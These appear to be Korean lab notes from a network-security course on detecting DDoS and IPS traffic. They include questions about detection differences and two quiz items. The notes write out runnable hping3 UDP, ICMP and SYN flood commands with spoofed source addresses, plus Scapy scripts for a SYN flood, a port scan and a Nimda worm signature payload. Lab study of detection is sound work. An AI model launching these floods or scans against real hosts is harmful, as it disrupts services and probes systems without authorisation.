


L7 공격(커넥션)은 막기가 되게 어려움
공격 패킷과 정상 패킷을 구분하기가 어려움 한 번에 여러개를 보내는 게 한 두개만 보내는데 그게 
장비에서 임계치 기반의 기존 방식으로는 탐지하기가 어려움


UDP, 대역폭은 막기 쉬움, 임계치 기반 정책으로 막기 쉬움





질문
- 디도스 장비의 탐지내역과 IPS의 탐지내역에 뜨는 게 서로 다른 이유는 두 장비의 탐지 정책이 서로 다르기 때문이다.
- hping3로 보내는 공격은 IPS에서 탐지가 왜 안 되는 것인가? 차단정책이 없기 때문인가, 차단하고 싶으면 IPS 차단정책에서 사용자 정의에서 정책을 추가해서 차단할 수 있는가
- 파이썬 명령어로 된 공격들은 IPS에서만 보이고, 디도스에서는 안 보이고, 시스템 명령어로 된 공격들은 IPS에서는 안 보이고 디도스에서만 보이는데 단순히 정책 차이인 것인가 아니면 네트워크 구성에 의한 것인가
- 그림에서 FW과 DDoS 장비의 위치는 잘못 적은 것인가

- UDP 플로딩: !hping3 --udp -p 2 --flood 4.8.16.32
- ICMP 플로딩: !hping3 --icmp --flood 4.8.16.32      (icmp에는 포트가 없어서 p 53을 해도 안 한 것과 같음)
- \* 둘 다 명령어 앞에 '!'을 붙이지 않으면 동작 안 함 왜냐하면 scapy는 파이썬 문법을 그대로 다 사용할 수 있어서 입력되는 모든 문장을 파이썬 문법으로 해석하려고함. 그래서 앞에 '!'을 안 붙이고 그냥 "hping3 --udp -p 53 --flood 2.2.2.3"라고 입력하면 파이썬 코드로 인식해서 문법오류가 발생하지만 앞에 !을 붙이면 뒤에 오는 문장이 파이썬 코드가 아니라 시스템 명령어라고 알리기 때문에 오류가 발생 안 함


아래의 코드는 명령어가 아닌 파이썬 코드임
1. 패턴블럭 - "Win32/Nimda, Worm (TCP-25)" 
p1 = Ether(src="10:65:30:2F:D9:9B", dst="e0:ac:f1:f7:da:40")/IP(src="1.1.1.1", dst="2.2.2.2")/TCP(sport=1025, dport=25, flags="PA")/"11CFvcbVPPHG1TzxxtU88E6pcPHW1TzyZqkU8dbV"  
sendp(p1, count=12345)

2. 서비스거부 - TCP SYN Flooding
p1 = Ether(src="10:65:30:2F:D9:9B", dst="e0:ac:f1:f7:da:40")/IP(src="1.1.1.1", dst="2.2.2.2")/TCP(sport=1025, dport=80, flags="S")
sendp(p1, count=23456)

3. 정보수집 - SYN Port Scan
p1 = Ether(src="10:65:30:2F:D9:9B", dst="e0:ac:f1:f7:da:40")/IP(src="1.1.1.1", dst="2.2.2.2")/TCP(sport=1025, dport=range(1025, 1125), flags="S")
sendp(p1, count=200)

4. 정보수집 - UDP Invalid Data
p1 = Ether(src="10:65:30:2F:D9:9B", dst="e0:ac:f1:f:da:40")/IP(src="1.1.1.1", dst="2.2.2.2")/UDP(sport=1025, dport=80) 
sendp(p1, count=30000)


- UDP 플로딩: !hping3 --udp -p 80 --flood -a 10.100.10.1 10.100.10.2
- ICMP 플로딩: !hping3 --icmp --flood -a 10.100.10.1 10.100.10.2
- TCP 플로딩: !hping3 -S -p 80 --flood -a 10.100.10.1 10.100.10.2










시험문제
1. 디도스 공격의 의미
	1. 서버에 악성코드를 설치하는 공격
	2. 서버 데이터를 훔치는 공격
	3. 서비스를 정상적으로 사용하지 못하게 만드는 공격
	4. 계정 정보를 탈취하는 공격
2. 디도스 방어 장비의 역할
	1. 서버 패치 자동화
	2. 악성 트래픽 차단
	3. 계정 관리
	4. 데이터 백업
















